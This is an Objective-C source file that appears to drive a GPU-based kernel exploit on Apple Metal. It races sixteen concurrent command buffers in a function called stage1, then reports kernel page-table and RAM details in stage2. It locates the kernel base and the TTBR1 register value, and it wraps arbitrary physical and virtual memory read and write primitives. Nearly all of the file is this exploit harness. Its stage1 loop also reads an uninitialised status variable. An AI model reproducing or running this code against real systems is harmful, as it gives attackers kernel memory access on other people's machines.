#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

#include "runner.h"
#include "constants.h"

const unsigned int inBufferSize = 32 * 1024 * 1024;
const unsigned int outBufferSize = 32 * 1024 * 1024;

#define COUNT 16

static id<MTLDevice> device;

static id<MTLComputePipelineState> f_readmem, f_writemem,
    f_stage1, f_stage2, f_find_kttbr1, f_find_kbase,
    f_vreadmem, f_vwritemem;
static id<MTLBuffer> buf_in, buf_out, buf_dummy, buf_out2;
static uint64_t *in, *out, *out2, *dummy;
static id<MTLCommandBuffer> commandBuffer;
static id<MTLComputeCommandEncoder> computeEncoder;
static MTLSize tsize;
id<MTLCommandQueue> cmd_queue[COUNT];

int runner_init(void)
{
    device = MTLCreateSystemDefaultDevice();

    NSError* error = nil;
    NSURL *lib = [NSURL fileURLWithPath:@"./default.metallib"];
    NSError *libraryError = NULL;
    id<MTLLibrary> defaultLibrary = [device newLibraryWithURL:lib error:&libraryError];
    if (defaultLibrary == nil) {
        NSLog(@"Failed to find the default library.");
        return -1;
    }

    id<MTLFunction> func = [defaultLibrary newFunctionWithName:@"readmem"];
    f_readmem = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"writemem"];
    f_writemem = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"vreadmem"];
    f_vreadmem = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"vwritemem"];
    f_vwritemem = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"stage1"];
    f_stage1 = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"stage2"];
    f_stage2 = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"find_kttbr1"];
    f_find_kttbr1 = [device newComputePipelineStateWithFunction: func error:&error];
    func = [defaultLibrary newFunctionWithName:@"find_kbase"];
    f_find_kbase = [device newComputePipelineStateWithFunction: func error:&error];

    buf_in = [device newBufferWithLength:inBufferSize options:MTLResourceStorageModeShared|MTLResourceHazardTrackingModeUntracked];
    buf_out = [device newBufferWithLength:outBufferSize options:MTLResourceStorageModeShared|MTLResourceHazardTrackingModeUntracked];
    buf_out2 = [device newBufferWithLength:outBufferSize options:MTLResourceStorageModeShared|MTLResourceHazardTrackingModeUntracked];
    buf_dummy = [device newBufferWithLength:inBufferSize options:MTLResourceStorageModeShared|MTLResourceHazardTrackingModeUntracked];

    in = buf_in.contents;
    out = buf_out.contents;
    out2 = buf_out2.contents;
    dummy = buf_dummy.contents;

    tsize = MTLSizeMake(1, 1, 1);

    for (int i = 0; i < COUNT; i++) {
        cmd_queue[i] = [device newCommandQueue];
        assert(cmd_queue[i] != nil);
    }

    return 0;
}

static void run_one(id<MTLComputePipelineState> func)
{
    int i, j;

    memset(out, 0, outBufferSize);

    id<MTLCommandBuffer> cmdbuf;
    id<MTLComputeCommandEncoder> enc;

    cmdbuf = [cmd_queue[0] commandBuffer];
    assert(cmdbuf != nil);
    enc = [cmdbuf computeCommandEncoder];
    assert(enc != nil);

    [enc setComputePipelineState:func];
    [enc setBuffer:buf_in offset:0 atIndex:0];
    [enc setBuffer:buf_out offset:0 atIndex:1];
    [enc dispatchThreads:tsize threadsPerThreadgroup:tsize];
    [enc endEncoding];

    [cmdbuf commit];
    [cmdbuf waitUntilCompleted];
}

void readmem(u64 gpuva, size_t size, void *buf)
{
    /* Handle physical addresses too */
    if (gpuva >= p_ram_base && gpuva < p_ram_top_max)
        gpuva |= vg_phys_base;

    in[0] = gpuva;
    in[1] = size;
    run_one(f_readmem);
    memcpy(buf, out, size);
}

void writemem(u64 gpuva, size_t size, void *buf)
{
    /* Handle physical addresses too */
    if (gpuva >= p_ram_base && gpuva < p_ram_top_max)
        gpuva |= vg_phys_base;

    in[0] = gpuva;
    in[1] = size;
    memcpy(&in[2], buf, size);
    run_one(f_writemem);
}

u64 read64(u64 gpuva)
{
    u64 val;

    readmem(gpuva, 8, &val);
    return val;
}

u32 read32(u64 gpuva)
{
    u32 val;

    readmem(gpuva, 4, &val);
    return val;
}

u16 read16(u64 gpuva)
{
    u16 val;

    readmem(gpuva, 2, &val);
    return val;
}

u8 read8(u64 gpuva)
{
    u8 val;

    readmem(gpuva, 1, &val);
    return val;
}

void write64(u64 gpuva, u64 val)
{
    writemem(gpuva, 8, &val);
}

void write32(u64 gpuva, u32 val)
{
    writemem(gpuva, 4, &val);
}

void write16(u64 gpuva, u16 val)
{
    writemem(gpuva, 2, &val);
}

void write8(u64 gpuva, u8 val)
{
    writemem(gpuva, 1, &val);
}

void vreadmem(u64 ttbr, u64 va, size_t size, void *buf)
{
    in[0] = ttbr;
    in[1] = va;
    in[2] = size;
    run_one(f_vreadmem);
    memcpy(buf, out, size);
}

void vwritemem(u64 ttbr, u64 va, size_t size, void *buf)
{
    in[0] = ttbr;
    in[1] = va;
    in[2] = size;
    memcpy(&in[3], buf, size);
    run_one(f_vwritemem);
}

u64 vread64(u64 ttbr, u64 va)
{
    u64 val;

    vreadmem(ttbr, va, 8, &val);
    return val;
}

u32 vread32(u64 ttbr, u64 va)
{
    u32 val;

    vreadmem(ttbr, va, 4, &val);
    return val;
}

u16 vread16(u64 ttbr, u64 va)
{
    u16 val;

    vreadmem(ttbr, va, 2, &val);
    return val;
}

u8 vread8(u64 ttbr, u64 va)
{
    u8 val;

    vreadmem(ttbr, va, 1, &val);
    return val;
}

void vwrite64(u64 ttbr, u64 va, u64 val)
{
    vwritemem(ttbr, va, 8, &val);
}

void vwrite32(u64 ttbr, u64 va, u32 val)
{
    vwritemem(ttbr, va, 4, &val);
}

void vwrite16(u64 ttbr, u64 va, u16 val)
{
    vwritemem(ttbr, va, 2, &val);
}

void vwrite8(u64 ttbr, u64 va, u8 val)
{
    vwritemem(ttbr, va, 1, &val);
}

bool stage1(void)
{
    int i, j;

    memset(out2, 0, outBufferSize);

    id<MTLCommandBuffer> cmdbuf[COUNT];
    id<MTLComputeCommandEncoder> enc[COUNT];

    for (int i = 0; i < COUNT; i++) {
        dummy[i] = i + 1;
        cmdbuf[i] = [cmd_queue[i] commandBuffer];
        assert(cmdbuf[i] != nil);
        enc[i] = [cmdbuf[i] computeCommandEncoderWithDispatchType:MTLDispatchTypeConcurrent];
        assert(enc[i] != nil);
    }

    in[0] = 1;

    for (i = 0; i < COUNT; i++) {
        [enc[i] setComputePipelineState:f_stage1];
        if (i == 0)
            [enc[i] setBuffer:buf_in offset:0 atIndex:0];
        else
            [enc[i] setBuffer:buf_dummy offset:(8 * i) atIndex:0];
        [enc[i] setBuffer:buf_out2 offset:0 atIndex:1];
        [enc[i] dispatchThreads:tsize threadsPerThreadgroup:tsize];
        [enc[i] endEncoding];
    }

    printf("Enqueuing commands...\n");
    printf("  #1 ");
    [cmdbuf[0] commit];
    usleep(60000);

    for (i = 1; i < COUNT; i++) {
        printf("#%d ", i + 1);
        fflush(stdout);
        [cmdbuf[i] commit];
    }
    printf("\n");

    printf("Waiting for completion...\n  ");

    for (i = 1; i < COUNT; i++) {
        int j;
        MTLCommandBufferStatus st;
        for (j = 0; j < 1000; j++) {
            MTLCommandBufferStatus st = [cmdbuf[i] status];
            if (st == MTLCommandBufferStatusCompleted ||
                st == MTLCommandBufferStatusError)
                break;
            usleep(1000);
        }
        if (st == MTLCommandBufferStatusCompleted) {
            [cmdbuf[i] waitUntilCompleted];
        }
        printf("#%d:%d ", i + 1, (unsigned int)st);
        fflush(stdout);
    }
    printf("\n");

    [cmdbuf[0] waitUntilCompleted];
    printf("  #1 completed!\n");

    printf("Command buffer states:\n  ");

    bool missing = false;
    for (i = 0; i < COUNT; i++) {
        printf("%d:%lld ", i + 1, out2[i + 1]);
        fflush(stdout);
        if (i > 0 && out2[i + 1] == 0)
            missing = true;
    }
    printf("\n");

    printf("Stage 1 state: 0x%llx\n\n", out2[512]);

    if (missing)
        printf("Success!\n\n");
    else
        printf("Failed...\n\n");

    return missing;
}

bool stage2(u64 *p_ram_start, u64 *ram_size)
{
    run_one(f_stage2);

    printf("Stage 2 state: 0x%llx\n", out[0]);
    printf("  p_kpt0        = 0x%llx\n", out[1]);
    printf("  p_new_pt      = 0x%llx\n", out[2]);
    printf("  p_ram_top     = 0x%llx\n", out[3]);
    printf("  vg_homm       = 0x%llx\n", out[4]);
    printf("  homm_cnt      = 0x%llx\n", out[5]);
    printf("  homm_esz      = 0x%llx\n", out[6]);
    printf("  homm_hsz      = 0x%llx\n", out[7]);
    printf("  p_vram_start  = 0x%llx\n", out[8]);
    printf("  vram_size     = 0x%llx\n", out[9]);
    printf("  p_ram_start   = 0x%llx\n", out[10]);
    printf("  ram_size      = 0x%llx\n\n", out[11]);

    *p_ram_start = out[10];
    *ram_size = out[11];

    if (out[0] == 0xffff && *p_ram_start && *ram_size) {
        printf("Success!\n\n");
        return true;
    } else {
        printf("Failed...\n\n");
        return false;
    }
}

bool find_kbase(u64 *base)
{
    run_one(f_find_kbase);

    if (out[0] == 0xffff) {
        *base = out[1];
        return true;
    } else {
        return false;
    }
}

bool find_kttbr1(u64 *ttbr1)
{
    run_one(f_find_kttbr1);

    if (out[0] == 0xffff) {
        *ttbr1 = out[1];
        return true;
    } else {
        return false;
    }
}
